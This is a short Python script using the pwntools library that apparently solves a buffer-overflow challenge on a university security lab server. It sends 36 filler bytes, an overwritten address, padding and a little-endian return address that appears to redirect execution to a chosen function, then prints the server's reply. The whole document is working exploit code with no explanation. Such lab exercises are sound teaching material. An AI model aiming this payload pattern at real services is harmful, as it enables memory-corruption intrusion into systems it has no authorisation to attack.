from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 23155

s = remote(SERVER, PORT, timeout=9999)

s.sendline(b'1'*36 + 0x804a001.to_bytes(length=4,byteorder='little') + b'1'*4 + 0x080487d9.to_bytes(length=4,byteorder='little'))
response = s.recvline()

print(response.decode())
